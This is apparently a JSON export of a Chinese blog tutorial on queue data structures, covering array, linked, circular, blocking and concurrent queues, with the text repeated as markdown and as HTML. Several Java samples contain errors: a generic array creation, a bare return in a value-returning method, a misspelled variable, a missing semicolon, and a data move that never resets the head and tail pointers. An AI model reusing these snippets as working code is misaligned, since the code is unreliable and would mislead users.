%}\n\n前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？\n\n线程安全的队列我们叫做**并发队列**。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？\n\n我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？\n\n我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？\n\n基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。\n\n而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。\n\n除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟栈很相似的数据结构，队列。\n\n队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。\n\n循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。\n\n除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。\n\n如数据库的连接池、分布式应用中的消息队列（kafka、MQ）\n\n2、 关于并发队列，如何实现无锁的并发队列。\n\n> 提示： CAS(compare and swap) 乐观锁 悲观锁\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","source":"_posts/算法-队列.md","raw":"---\ntitle: 算法-队列\ndate: 2018-09-16 00:18:36\ntags: ['算法','队列']\ncategories: 算法\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。\n\n当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？\n\n其实，这些问题并不复杂，其底层的数据结构就是今天的内容，**队列(queue)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解队列\n{% endnote %}\n</div>\n\n队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。**先进者先出，这就是典型的队列**。\n\n我们知道，栈只支持两个操作：**入栈push()和出栈pop()**，队列和栈非常类似，支持的操作只有：**入队enqueue()**，将一个数据放入队尾，**出队dequeue()**，从队头取出一个数据。\n\n{% asset_img 队列.jpg %}\n\n所以，队列跟栈一样，也是一种操作受限的线性表数据结构。\n\n队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 顺序队列和链式队列\n{% endnote %}\n</div>\n\n我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？\n\n跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做**顺序队列**，用链表实现的队列叫做**链式队列**。\n\n先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。\n\n```java\n// 基于数组实现的队列\npublic class ArrayQueue<T>{\n\t// 数组items\n\tprivate T[] items;\n\t// 队列大小\n\tprivate int size=0;\n\tprivate int capacity;\n\t// head表示队头下标，tail表示队尾下标\n\tprivate int head=0;\n\tprivate int tail=0;\n\n\tpublic ArrayQueue(){\n\t\tthis(10); // 队列默认容量给10\n\t}\n\tpublic ArrayQueue(int capacity){\n\t\tthis.items = new T[capacity];\n\t\tthis.capacity = capacity;\n\t}\n\n\tpublic boolean enqueue(T val){\n\t\tif(size == capacity){return false;} // 队列满了\n\t\titems[tail] = val;\n\t\tsize ++;\n\t\ttail ++;\n\t\treturn true;\n\t}\n\n\tpublic T dequeue(){\n\t\tif (size == 0) {\n\t\t\treturn;\n\t\t}\n\t\tT res = items[head];\n\t\thead++;\n\t\tsize--;\n\t\treturn res;\n\t}\n}\n```\n比起栈的数组实现，队列的数组实现稍微有点复杂。\n\n对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。\n\n你可以结合下面这幅图来理解。当a、b、c、d...依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。\n\n{% asset_img 示例1.jpg %}\n\n当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。\n\n{% asset_img 示例2.jpg %}\n\n你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？\n\n在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？**数据搬移**！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？\n\n实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。\n\n```java\npublic boolean enqueue(T val){\n\tif(size == capacity){return false;} // 队列满了\n\t// tail到尾部，队列没有满\n\tif (tail == capactity && size<capacity) {\n\t\t// 数据搬移\n\t\tfor (int i=head;i<tail;i++) {\n\t\t\t// 将head到tail的数据搬移到0到size的位置\n\t\t\titems[i-head] = items[i]\n\t\t}\n\t}\n\t\n\titems[tail] = val;\n\tsize ++ ;\n\ttail ++;\n\treturn true;\n}\n```\n\n从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，\n\n这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的**摊还分析法**自行分析一下。\n\n接下来，我们看看**基于链表的队列的实现方法**。\n\n基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail->next = newNode, tail = tail->next;出队时，head = head->next。\n\n我将具体代码放到我的[github](https://github.com/AriesRen/algorithm)上，有需要的可以看看。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 循环队列\n{% endnote %}\n</div>\n\n我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。\n\n循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。\n\n{% asset_img 循环队列.jpg %}\n\n我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。\n\n通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，**确定队列空和队列满的判定条件**。\n\n在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？\n\n队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。\n\n{% asset_img 循环队列满.jpg %}\n\n图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者--，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。\n\n下面看下一下循环队列的代码：\n```java\n// 基于数组实现的循环队列\npublic class CircularQueue<T> implements Queue<T> {\n    // 数组items\n    private Object[] items;\n    // 队列大小\n    private int size=0;\n    private int capacity;\n    // head表示队头下标，tail表示队尾下标\n    private int head=0;\n    private int tail=0;\n\n    public CircularQueue(){\n        this(10); // 队列默认容量给10\n    }\n    public CircularQueue(int capacity){\n        this.items = new Object[capacity];\n        this.capacity = capacity;\n    }\n\n    public boolean enqueue(T val){\n        if ((tail+1)%capacity == head){\n            throw new RuntimeException(\"循环队列满了！\");\n        }\n        items[tail] = val;\n        tail = (tail+1)%capacity;\n        size ++;\n        return true;\n    }\n\n    public T dequeue(){\n       if (size<=0){\n           throw new RuntimeException(\"空队列！\");\n       }\n       T res = (T) items[head];\n       size--;\n       head = (head+1)%capacity;\n       return res;\n    }\n\n    @Override\n    public String toString() {\n        return Arrays.toString(items);\n    }\n\n    @Override\n    public int size() {\n        return size;\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 阻塞队列和并发队列\n{% endnote %}\n</div>\n\n上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。\n\n**阻塞队列**其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。\n\n{% asset_img 阻塞队列.jpg %}\n\n你应该已经发现了，上述的定义就是一个\"生产者-消费者模型\"！是的，我们可以用阻塞队列轻松实现一个\"生产者-消费者模型\"。\n\n这种基于阻塞队列实现的\"生产者-消费者模型\"可以有效的协调生产和消费的速度。当\"生产者\"生产数据的速度过快，\"消费者\"来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到\"消费者\"消费了数据，\"生产者\"才会被唤醒继续生产。\n\n而且不仅如此，基于阻塞队列，我们可以通过协调\"生产者\"和\"消费者\"的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个\"消费者\"，来对应一个\"生产者\"。\n\n{% asset_img 多消费者阻塞队列.jpg %}\n\n前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？\n\n线程安全的队列我们叫做**并发队列**。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？\n\n我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？\n\n我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？\n\n基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。\n\n而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。\n\n除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟栈很相似的数据结构，队列。\n\n队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。\n\n循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。\n\n除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。\n\n如数据库的连接池、分布式应用中的消息队列（kafka、MQ）\n\n2、 关于并发队列，如何实现无锁的并发队列。\n\n> 提示： CAS(compare and swap) 乐观锁 悲观锁\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"算法-队列","published":1,"updated":"2018-11-29T09:59:50.838Z","_id":"cjpdmv0bf002w4cv0a54d5sas","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。</p>\n<p>当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？</p>\n<p>其实，这些问题并不复杂，其底层的数据结构就是今天的内容，<strong>队列(queue)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解队列\"><a href=\"#如何理解队列\" class=\"headerlink\" title=\"如何理解队列\"></a>如何理解队列</h3></div><br></div>\n\n<p>队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。<strong>先进者先出，这就是典型的队列</strong>。</p>\n<p>我们知道，栈只支持两个操作：<strong>入栈push()和出栈pop()</strong>，队列和栈非常类似，支持的操作只有：<strong>入队enqueue()</strong>，将一个数据放入队尾，<strong>出队dequeue()</strong>，从队头取出一个数据。</p>\n<img src=\"/posts/2018-09-16-算法-队列/队列.jpg\">\n<p>所以，队列跟栈一样，也是一种操作受限的线性表数据结构。</p>\n<p>队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"顺序队列和链式队列\"><a href=\"#顺序队列和链式队列\" class=\"headerlink\" title=\"顺序队列和链式队列\"></a>顺序队列和链式队列</h3></div><br></div>\n\n<p>我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？</p>\n<p>跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做<strong>顺序队列</strong>，用链表实现的队列叫做<strong>链式队列</strong>。</p>\n<p>先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayQueue</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 数组items</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> T[] items;</span><br><span class=\"line\">\t<span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">\t<span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> T[capacity];</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t\titems[tail] = val;</span><br><span class=\"line\">\t\tsize ++;</span><br><span class=\"line\">\t\ttail ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tT res = items[head];</span><br><span class=\"line\">\t\thead++;</span><br><span class=\"line\">\t\tsize--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比起栈的数组实现，队列的数组实现稍微有点复杂。</p>\n<p>对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。</p>\n<p>你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例1.jpg\">\n<p>当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例2.jpg\">\n<p>你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？</p>\n<p>在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？<strong>数据搬移</strong>！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？</p>\n<p>实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t<span class=\"comment\">// tail到尾部，队列没有满</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tail == capactity &amp;&amp; size&lt;capacity) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 数据搬移</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=head;i&lt;tail;i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 将head到tail的数据搬移到0到size的位置</span></span><br><span class=\"line\">\t\t\titems[i-head] = items[i]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\titems[tail] = val;</span><br><span class=\"line\">\tsize ++ ;</span><br><span class=\"line\">\ttail ++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，</p>\n<p>这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的<strong>摊还分析法</strong>自行分析一下。</p>\n<p>接下来，我们看看<strong>基于链表的队列的实现方法</strong>。</p>\n<p>基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。</p>\n<p>我将具体代码放到我的<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">github</a>上，有需要的可以看看。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"循环队列\"><a href=\"#循环队列\" class=\"headerlink\" title=\"循环队列\"></a>循环队列</h3></div><br></div>\n\n<p>我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。</p>\n<p>循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列.jpg\">\n<p>我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。</p>\n<p>通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，<strong>确定队列空和队列满的判定条件</strong>。</p>\n<p>在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？</p>\n<p>队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列满.jpg\">\n<p>图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。</p>\n<p>下面看下一下循环队列的代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span 